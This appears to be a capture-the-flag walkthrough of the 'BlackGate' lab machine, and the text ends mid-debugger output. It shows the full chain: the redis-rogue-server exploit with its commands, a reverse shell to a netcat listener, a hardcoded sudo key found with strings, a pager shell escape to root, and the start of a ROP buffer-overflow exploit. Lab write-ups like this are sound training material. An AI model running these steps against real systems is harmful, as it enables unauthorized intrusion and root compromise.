### BlackGate Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.88.176

Nmap Scan: 

```
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/BlackGate]
└─$ cat nmapscan  
# Nmap 7.92 scan initiated Sat Jan 21 12:11:54 2023 as: nmap -sCV -A -p22,6379 -oN nmapscan 192.168.88.176
Nmap scan report for 192.168.88.176
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 21 12:12:15 2023 -- 1 IP address (1 host up) scanned in 20.76 seconds
 ```
 
 From the scan only two ports are open which are ssh and redis server
 
 The version for the redis is 4.0.14 which is pretty old 
 
 There's an exploit called redis-regue-server which works for redis <= 5.0.5
 
 And it's a remote code execution exploit
 
 Installation:
 
 ```
 git clone https://github.com/n0b0dyCN/redis-rogue-server.git
 cd redis-rogue-server
 cd RedisModulesSDK/exp 
 make
 mv exp.so ../..
 cd ../..
 ```
 
 Now we can run the python exploit 
 
 But first lets check the help manual
 
 ```
                                                                                                         
┌──(mark㉿haxor)-[~/Desktop/Tools/redis-rogue-server]
└─$ python3 redis-rogue-server.py --help                                                 
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

Usage: redis-rogue-server.py [options]

Options:
  -h, --help           show this help message and exit
  --rhost=REMOTE_HOST  target host
  --rport=REMOTE_PORT  target redis port, default 6379
  --lhost=LOCAL_HOST   rogue server ip
  --lport=LOCAL_PORT   rogue server listen port, default 21000
  --exp=EXP_FILE       Redis Module to load, default exp.so
  -v, --verbose        Show full data stream
  --passwd=RPASSWD     target redis password
```

So we just need to set the rhost and rport also lhost and lport 

But by default rport is set to 6379 which is the default redis server port 

So we only need rhost, lhost and lport

```
┌──(mark㉿haxor)-[~/Desktop/Tools/redis-rogue-server]
└─$ python3 redis-rogue-server.py --rhost=192.168.88.176 --lhost=192.168.49.88 --lport=80  
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.88.176:6379
[info] SERVER 192.168.49.88:80
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: 
```

It asks if we need a reverse shell (hell yea we do)

So i set up a listener on port 22 and continue the process

```
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/Tools/redis-rogue-server]
└─$ python3 redis-rogue-server.py --rhost=192.168.88.176 --lhost=192.168.49.88 --lport=80  
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.88.176:6379
[info] SERVER 192.168.49.88:80
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r 
[info] Open reverse shell...
Reverse server address: 192.168.49.88
Reverse server port: 22
[info] Reverse shell payload sent.
[info] Check at 192.168.49.88:22
[info] Unload module...
```

Back on the listner

```
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/BlackGate]
└─$ nc -lvnp 22                                         
listening on [any] 22 ...
connect to [192.168.49.88] from (UNKNOWN) [192.168.88.176] 39046
whoami
prudence
id
uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)
```

Now stabilizing the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg 
reset
```

Now in the user's directory there's a note.txt file

```
prudence@blackgate:/tmp$ cd /home/prudence/
prudence@blackgate:/home/prudence$ ls
local.txt  notes.txt
prudence@blackgate:/home/prudence$ cat notes.txt 
[✔] Setup redis server
[✖] Turn on protected mode
[✔] Implementation of the redis-status
[✔] Allow remote connections to the redis server 
prudence@blackgate:/home/prudence$ 
```

Ok so we see the user setted up a redis server, implemented redis-status, allow remote connection to the server but didn't turn on protected mode

So lets see what we can loot now

Checking for sudo permission shows  we can run redis-status as root

```
prudence@blackgate:/home/prudence$ sudo -l
Matching Defaults entries for prudence on blackgate:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
prudence@blackgate:/home/prudence$ 
```

So lets run it and see what happens

But it asks for authorization key :(

```
prudence@blackgate:/home/prudence$ sudo /usr/local/bin/redis-status
[*] Redis Uptime
Authorization Key: lol
Wrong Authorization Key!
Incident has been reported!
prudence@blackgate:/home/prudence$ 
```

Running strings on the binary leaks the authorization key

```
prudence@blackgate:/home/prudence$ strings /usr/local/bin/redis-status
/lib64/ld-linux-x86-64.so.2
gets
puts
printf
stderr
system
fwrite
strcmp
__libc_start_main
libc.so.6
GLIBC_2.2.5
__gmon_start__
H=X@@
[]A\A]A^A_
[*] Redis Uptime
Authorization Key: 
ClimbingParrotKickingDonkey321
/usr/bin/systemctl status redis
Wrong Authorization Key!
Incident has been reported!
:*3$"
GCC: (Ubuntu 10.3.0-1ubuntu1~20.10) 10.3.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/crt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
redis-status.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
gets@@GLIBC_2.2.5
__libc_csu_init
_dl_relocate_static_pie
__bss_start
main
fwrite@@GLIBC_2.2.5
__TMC_END__
stderr@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
prudence@blackgate:/home/prudence$ 
```

So authorization key = ClimbingParrotKickingDonkey321

```
[*] Redis Uptime
Authorization Key: 
ClimbingParrotKickingDonkey321
/usr/bin/systemctl status redis
Wrong Authorization Key!
Incident has been reported!
```

Now lets rerun the binary since we have the key now

```
prudence@blackgate:/home/prudence$ sudo redis-status
[*] Redis Uptime
Authorization Key: ClimbingParrotKickingDonkey321
● redis.service - redis service
     Loaded: loaded (/etc/systemd/system/redis.service; enabled; vendor preset:>
     Active: active (running) since Sat 2023-01-21 14:00:24 UTC; 8min ago
   Main PID: 784 (sh)
      Tasks: 8 (limit: 1062)
     Memory: 22.2M
     CGroup: /system.slice/redis.service
             ├─ 784 [sh]
             ├─1058 python3 -c import pty; pty.spawn('/bin/bash')
             ├─1059 /bin/bash
             ├─1364 sudo redis-status
             ├─1365 redis-status
             ├─1366 sh -c /usr/bin/systemctl status redis
             ├─1367 /usr/bin/systemctl status redis
             └─1368 pager

Jan 21 14:00:31 blackgate redis-server[784]: 784:M 21 Jan 14:00:31.551 # Settin>
Jan 21 14:00:31 blackgate redis-server[784]: 784:M 21 Jan 14:00:31.551 * MASTER>
Jan 21 14:05:09 blackgate sudo[1209]: prudence : TTY=pts/0 ; PWD=/home/prudence>
Jan 21 14:05:09 blackgate sudo[1209]: pam_unix(sudo:session): session opened fo>
Jan 21 14:05:12 blackgate sudo[1209]: pam_unix(sudo:session): session closed fo>
Jan 21 14:08:25 blackgate sudo[1352]: prudence : TTY=pts/0 ; PWD=/home/prudence>
Jan 21 14:08:25 blackgate sudo[1352]: pam_unix(sudo:session): session opened fo>
lines 1-23

```

So we can keep on scrolling down 

Now there are two ways I got around getting root 

The first one is likely unintended anyways lets see it

#### Likely Unintended 

What i did next was to try call /bin/bash 

```
SHIFT + 1
/bin/bash
```

And it landed us as root sweeet 😸

```
prudence@blackgate:/home/prudence$ sudo redis-status
[*] Redis Uptime
Authorization Key: ClimbingParrotKickingDonkey321
● redis.service - redis service
     Loaded: loaded (/etc/systemd/system/redis.service; enabled; vendor preset:>
     Active: active (running) since Sat 2023-01-21 14:00:24 UTC; 8min ago
   Main PID: 784 (sh)
      Tasks: 8 (limit: 1062)
     Memory: 22.2M
     CGroup: /system.slice/redis.service
             ├─ 784 [sh]
             ├─1058 python3 -c import pty; pty.spawn('/bin/bash')
             ├─1059 /bin/bash
             ├─1364 sudo redis-status
             ├─1365 redis-status
             ├─1366 sh -c /usr/bin/systemctl status redis
             ├─1367 /usr/bin/systemctl status redis
             └─1368 pager

Jan 21 14:00:31 blackgate redis-server[784]: 784:M 21 Jan 14:00:31.551 # Settin>
Jan 21 14:00:31 blackgate redis-server[784]: 784:M 21 Jan 14:00:31.551 * MASTER>
Jan 21 14:05:09 blackgate sudo[1209]: prudence : TTY=pts/0 ; PWD=/home/prudence>
Jan 21 14:05:09 blackgate sudo[1209]: pam_unix(sudo:session): session opened fo>
Jan 21 14:05:12 blackgate sudo[1209]: pam_unix(sudo:session): session closed fo>
Jan 21 14:08:25 blackgate sudo[1352]: prudence : TTY=pts/0 ; PWD=/home/prudence>
Jan 21 14:08:25 blackgate sudo[1352]: pam_unix(sudo:session): session opened fo>
!/bin/bash
root@blackgate:/home/prudence# 
root@blackgate:/home/prudence# cd /root
root@blackgate:~# ls -al
total 32
drwx------  5 root root 4096 Jan 21 13:59 .
drwxr-xr-x 20 root root 4096 Dec  6  2021 ..
lrwxrwxrwx  1 root root    9 Dec  6  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Aug 14  2019 .bashrc
drwx------  2 root root 4096 Dec  6  2021 .cache
-rw-r--r--  1 root root  161 Sep 16  2020 .profile
-rw-------  1 root root   33 Jan 21 13:59 proof.txt
drwxr-xr-x  3 root root 4096 Dec  6  2021 snap
drwxr-xr-x  2 root root 4096 Dec  6  2021 .ssh
root@blackgate:~# 
```

#### Intended way

I transferred the binary back to my machine and decompiled using ghidra

Here's the main function pseudo code

```
undefined8 main(void)

{
  int success;
  char input [256];
  
  puts("[*] Redis Uptime");
  printf("Authorization Key: ");
  gets(input);
  success = strcmp(input,"ClimbingParrotKickingDonkey321");
  if (success == 0) {
    system("/usr/bin/systemctl status redis");
  }
  else {
    puts("Wrong Authorization Key!");
    fwrite("Incident has been reported!\n",1,0x1c,stderr);
  }
  return 0;
}
```

We can tell what's happening in the binary

```
1. It prints out the output which says authorization key
2. Recieves out input using gets() # bug here
3. Does a string compare of out input with ClimbingParrotKickingDonkey321
4. If its true that is our input is equal to the compared value, it runs system(/usr/bin/systemctl status redis
5. Else it prints out wrong authorization key and exits 
```

Looking at the code the main problem with it is the usage of gets() since it doesn't validate the amount of data it writes in a buffer in this case our input buffer can only hold up to 256bytes of data but we can overflow it 

Lets get to the exploitation part 🤓

Firstly i'll check the file type and the protections enabled

```
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/BlackGate]
└─$ file redis-status
redis-status: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b3e6813dd295d7429e328f168e6ce260f0ed33f6, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/BlackGate]
└─$ checksec --format=json --file=redis-status | jq
{
  "redis-status": {
    "relro": "partial",
    "canary": "no",
    "nx": "yes",
    "pie": "no",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "2"
  }
}
```

Its a x64 binary and the only protection enabled is NX (No Execute) meaning we won't be able to place shellcode on the stack and execute it

Now we know that we can cause a segmentation fault since it uses gets() to receive our input

Lets try it out

```
└─$ python2 -c 'print "A"*300' | ./redis-status 
[*] Redis Uptime
Authorization Key: Wrong Authorization Key!
Incident has been reported!
zsh: done                python2 -c 'print "A"*300' | 
zsh: segmentation fault  ./redis-status
```

Cool lets get the offset needed to overwrite the RIP ( Instruction Pointer )

I use gdb-gef for it

```
┌──(mark㉿haxor)-[~/…/B2B/Pg/Practice/BlackGate]
└─$ gdb-gef -q redis-status 
Reading symbols from redis-status...
(No debugging symbols found in redis-status)
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/mark/Desktop/B2B/Pg/Practice/BlackGate/redis-status 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[*] Redis Uptime
Authorization Key: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
Wrong Authorization Key!
Incident has been reported!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401270 in main ()


[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007fffffffdfa8  →  0x00007fffffffe2f5  →  "/home/mark/Desktop/B2B/Pg/Practice/BlackGate/redis[...]"
$rcx   : 0x00007ffff7ec1190  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x00007fffffffde98  →  "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"
$rbp   : 0x6261616161616168 ("haaaaaab"?)
$rsi   : 0x0000000000402089  →  "Incident has been reported!\n"
$rdi   : 0x00007ffff7f9da00  →  0x0000000000000000
$rip   : 0x0000000000401270  →  <main+154> ret 
$r8    : 0x00000000004057dd  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7de1c00  →  0x0010002200001aa2
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdfb8  →  0x00007fffffffe32f  →  0x5245545f5353454c ("LESS_TER"?)
$r14   : 0x0               
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde98│+0x0000: "iaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa"       ← $rsp
0x00007fffffffdea0│+0x0008: "jaaaaaabkaaaaaablaaaaaabmaaa"
0x00007fffffffdea8│+0x0010: "kaaaaaablaaaaaabmaaa"
0x00007fffffffdeb0│+0x0018: "laaaaaabmaaa"
0x00007fffffffdeb8│+0x0020: 0x00007f006161616d ("maaa"?)
0x00007fffffffdec0│+0x0028: 0x00007fffffffdfa8  →  0x00007fffffffe2f5  →  "/home/mark/Desktop/B2B/Pg/Practice/BlackGate/redis[...]"
0x00007fffffffdec8│+0x0030: 0xc573edf08bcaaacc
0x00007fffffffded0│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401265 <main+143>       call   0x4010e0 <fwrite@plt>
     0x40126a <main+148>       mov    eax, 0x0
     0x40126f <main+153>       leave  
 →   0x401270 <main+154>       ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "redis-status", stopped 0x401270 in main (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401270 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $rsp
[+] Searching for '6961616161616162'/'6261616161616169' with period=8
[+] Found at offset 264 (little-endian search) likely
gef➤ 
```

The offset is `264`. To exploit this binary since NX is disabled we need to make use of rop ( Return Oriented Programming ) which basically means chaining together small snippets of assembly with stack control to cause the program to do more complex things. 

Since we know that the binary is going to call system(/usr/bin/systemctl) lets find a was to make it rather call system(/bin/sh) 

I'll check for writeable section of the binary using `readelf`

```
└─$ readelf -S redis-status
There are 31 section headers, starting at offset 0x3ae0:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400318  00000318
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.gnu.pr[...] NOTE             0000000000400338  00000338
       0000000000000020  0000000000000000   A       0     0     8
  [ 3] .note.gnu.bu[...] NOTE             0000000000400358  00000358
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .note.ABI-tag     NOTE             000000000040037c  0000037c
       0000000000000020  0000000000000000   A       0     0     4
  [ 5] .gnu.hash         GNU_HASH         00000000004003a0  000003a0
       0000000000000024  0000000000000000   A       6     0     8
  [ 6] .dynsym           DYNSYM           00000000004003c8  000003c8
       00000000000000f0  0000000000000018   A       7     1     8
  [ 7] .dynstr           STRTAB           00000000004004b8  000004b8
       0000000000000065  0000000000000000   A       0     0     1
  [ 8] .gnu.version      VERSYM           000000000040051e  0000051e
       0000000000000014  0000000000000002   A       6     0     2
  [ 9] .gnu.version_r    VERNEED          0000000000400538  00000538
       0000000000000020  0000000000000000   A       7     1     8
  [10] .rela.dyn         RELA             0000000000400558  00000558
       0000000000000048  0000000000000018   A       6     0     8
  [11] .rela.plt         RELA             00000000004005a0  000005a0
       0000000000000090  0000000000000018  AI       6    24     8
  [12] .init             PROGBITS         0000000000401000  00001000
       000000000000001b  0000000000000000  AX       0     0     4
  [13] .plt              PROGBITS         0000000000401020  00001020
       0000000000000070  0000000000000010  AX       0     0     16
  [14] .plt.sec          PROGBITS         0000000000401090  00001090
       0000000000000060  0000000000000010  AX       0     0     16
  [15] .text             PROGBITS         00000000004010f0  000010f0
       0000000000000205  0000000000000000  AX       0     0     16
  [16] .fini             PROGBITS         00000000004012f8  000012f8
       000000000000000d  0000000000000000  AX       0     0     4
  [17] .rodata           PROGBITS         0000000000402000  00002000
       00000000000000a6  0000000000000000   A       0     0     8
  [18] .eh_frame_hdr     PROGBITS         00000000004020a8  000020a8
       0000000000000044  0000000000000000   A       0     0     4
  [19] .eh_frame         PROGBITS         00000000004020f0  000020f0
       0000000000000100  0000000000000000   A       0     0     8
  [20] .init_array       INIT_ARRAY       0000000000403e10  00002e10
       0000000000000008  0000000000000008  WA       0     0     8
  [21] .fini_array       FINI_ARRAY       0000000000403e18  00002e18
       0000000000000008  0000000000000008  WA       0     0     8
  [22] .dynamic          DYNAMIC          0000000000403e20  00002e20
       00000000000001d0  0000000000000010  WA       7     0     8
  [23] .got              PROGBITS         0000000000403ff0  00002ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [24] .got.plt          PROGBITS         0000000000404000  00003000
       0000000000000048  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000404048  00003048
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000404060  00003058
       0000000000000010  0000000000000000  WA       0     0     32
  [27] .comment          PROGBITS         0000000000000000  00003058
       000000000000002b  0000000000000001  MS       0     0     1
  [28] .symtab           SYMTAB           0000000000000000  00003088
       00000000000006a8  0000000000000018          29    47     8
  [29] .strtab           STRTAB           0000000000000000  00003730
       000000000000028f  0000000000000000           0     0     1
  [30] .shstrtab         STRTAB           0000000000000000  000039bf
       000000000000011f  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), l (large), p (processor specific)
```
                                            
We get lot of output but we need a WA (Writeable Allocation) section of the binary

Looking at it i'll pick `.data` i can also choose like `.bss`  but choosing like `.got` will mess up the memory address since those are part of the memory needed to perform syscalls 

Here's the strategy i'm going to do 

```
1. I need the address where out input will be stored in the .data section
2. After getting that we can then do: pop_rdi + sh + system
```

Lets get a pop_rdi gadget using ropper

```
└─$ ropper --file redis-status --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: redis-status
0x00000000004012e3: pop rdi; ret; 

```

Here's the script i used [GetAddr](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/pg/blackgate/getaddr.py)

On running it pauses 

```
└─$ python3 getaddr.py
[+] Starting local process './redis-status': pid 135706
[*] Paused (press any to continue)
```

I will then attach the process to gdb 

```
└─$ gdb-gef 
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
gef➤  attach 135706
Attaching to process 135706
Reading symbols from /home/mark/Desktop/B2B/Pg/Practice/BlackGate/redis-status...
(No debugging symbols found in /home/mark/Desktop/B2B/Pg/Practice/BlackGate/redis-status)
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
Reading symbols from /usr/lib/debug/.build-id/4a/ff0f9d796e67d413e44f332edace9ac0ca2401.debug...
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/4f/536ac1cd2e8806aed8556ea7795c47404de8a9.debug...
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x00007f4b636430ed in __GI___libc_read (fd=0x0, buf=0x177a6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f4b6371da80  →  0x00000000fbad2088
$rcx   : 0x00007f4b636430ed  →  0x5b77fffff0003d48 ("H="?)
$rdx   : 0x1000            
$rsp   : 0x00007ffc2d24dc98  →  0x00007f4b635cd00e  →  <_IO_file_underflow+382> test rax, rax
$rbp   : 0x00007f4b6371a5e0  →  0x0000000000000000
$rsi   : 0x000000000177a6b0  →  0x0000000000000000
$rdi   : 0x0               
$rip   : 0x00007f4b636430ed  →  0x5b77fffff0003d48 ("H="?)
$r8    : 0x179b000         
$r9    : 0x21001           
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x00007f4b6371e850  →  0x00007f4b6371da80  →  0x00000000fbad2088
$r13   : 0xd68             
$r14   : 0x00007f4b637199e0  →  0x0000000000000000
$r15   : 0xd68             
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc2d24dc98│+0x0000: 0x00007f4b635cd00e  →  <_IO_file_underflow+382> test rax, rax        ← $rsp
0x00007ffc2d24dca0│+0x0008: 0x0000000000000001
0x00007ffc2d24dca8│+0x0010: 0x00007f4b63643190  →  0x5877fffff0003d48 ("H="?)
0x00007ffc2d24dcb0│+0x0018: 0x000000000179b000
0x00007ffc2d24dcb8│+0x0020: 0x00007f4b6371da80  →  0x00000000fbad2088
0x00007ffc2d24dcc0│+0x0028: 0x00007f4b6371a5e0  →  0x0000000000000000
0x00007ffc2d24dcc8│+0x0030: 0x00007f4b6371e850  →  0x00007f4b6371da80  →  0x00000000fbad2088
0x00007ffc2d24dcd0│+0x0038: 0x00007f4b63548740  →  0x00007f4b63548740  →  [loop detected]
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f4b636430e7 <read+7>         je     0x7f4b63643100 <__GI___libc_read+32>
   0x7f4b636430e9 <read+9>         xor    eax, eax
   0x7f4b636430eb <read+11>        syscall 
 → 0x7f4b636430ed <read+13>        cmp    rax, 0xfffffffffffff000
   0x7f4b636430f3 <read+19>        ja     0x7f4b63643150 <__GI___libc_read+112>
   0x7f4b636430f5 <read+21>        ret    
   0x7f4b636430f6 <read+22>        cs     nop WORD PTR [rax+rax*1+0x0]
   0x7f4b63643100 <read+32>        sub    rsp, 0x28
   0x7f4b63643104 <read+36>        mov    QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "redis-status", stopped 0x7f4b636430ed in __GI___libc_read (), reason: STOPPED
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f4b636430ed → __GI___libc_read(fd=0x0, buf=0x177a6b0, nbytes=0x1000)
[#1] 0x7f4b635cd00e → _IO_new_file_underflow(fp=0x7f4b6371da80 <_IO_2_1_stdin_>)
[#2] 0x7f4b635ce002 → __GI__IO_default_uflow(fp=0x7f4b6371da80 <_IO_2_1_stdin_>)
[#3] 0x7f4b635c1f9d → _IO_gets(buf=0x7ffc2d24dd50 "")
[#4] 0x401216 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

Then i'll press the enter key then send /bin/sh

```
└─$ python3 getaddr.py
[+] Starting local process './redis-status': pid 136554
[*] Paused (press any to continue)
[*] Switching to interactive mode
[*] Redis Uptime
$ /bin/sh
$ 
```

Back on gdb-gef i'll enter `c`

```
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000100400000 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000000000404048  →  0x0068732f6e69622f ("/bin/sh"?)
$rbx   : 0x00007fff45b40538  →  0x00007fff45b42389  →  "./redis-status"
$rcx   : 0x00007fbb330f4a80  →  0x00000000fbad2088
$rdx   : 0x1               
$rsp   : 0x00007fff45b40448  →  0x00007fff45b40538  →  0x00007fff45b42389  →  "./redis-status"
$rbp   : 0x636161706361616f ("oaacpaac"?)
$rsi   : 0x1               
$rdi   : 0x00007fbb330f6a20  →  0x0000000000000000
$rip   : 0x100400000       
$r8    : 0x000000000183f7d9  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007fbb32f3ac00  →  0x0010002200001aa2
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fff45b40548  →  0x00007fff45b42398  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x00007fbb33150020  →  0x00007fbb331512e0  →  0x0000000000000000
